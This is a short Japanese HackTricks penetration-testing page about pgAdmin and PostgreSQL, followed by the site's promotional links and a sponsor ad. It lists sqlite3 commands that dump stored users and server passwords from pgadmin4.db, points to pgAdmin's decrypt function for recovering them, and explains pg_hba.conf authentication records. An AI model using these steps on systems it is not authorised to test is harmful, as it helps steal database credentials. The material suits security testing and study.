[pgadmin](https://www.pgadmin.org)は、PostgreSQLの管理および開発プラットフォームです。\
_**pgadmin4.db**_ファイル内には**パスワード**が含まれています。\
スクリプト内の_decrypt_関数を使用して、それらを復号化することができます：[https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

クライアントの認証は、一般的に _**pg\_hba.conf**_ という名前の設定ファイルで制御されます。このファイルには、いくつかのレコードがあります。レコードは次の7つの形式のいずれかを持つことができます。

![](https://lh4.googleusercontent.com/Ff8YbD3ppYmN2Omp-4M-0AAVhLsr4c2i7d7HUjgkE-O6NZ5zbaST1hdMPrp1AL\_xTXJalYe0HYxUk76vWJUfHZ5GuCDvIL1A-sMV44Z0CYSVgLM9ttFTDu-BhzewBGc7FeMarTLqsu\_N1ztXJg)

**各**レコードは、**接続タイプ**、**クライアントのIPアドレス範囲**（接続タイプに関連する場合）、**データベース名**、**ユーザ名**、およびこれらのパラメータに一致する接続に使用される**認証方法**を指定します。認証を実行するためには、一致する接続タイプ、クライアントアドレス、要求されたデータベース、およびユーザ名を持つ**最初のレコードが使用されます**。 "フォールスルー"や"バックアップ"はありません：**1つのレコードが選択され、認証が失敗した場合、後続のレコードは考慮されません**。一致するレコードがない場合、アクセスは拒否されます。\
パスワードベースの認証方法は、**md5**、**crypt**、および**password**です。これらの方法は、パスワードが接続を介して送信される方法を除いて、同様に動作します：それぞれ、MD5ハッシュ、crypt暗号化、およびクリアテキストです。制限として、cryptメソッドはpg\_authidで暗号化されたパスワードでは機能しません。

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** HackTricksであなたの会社を宣伝したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **および** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。

</details>

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化されたワークフローを簡単に構築および自動化します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
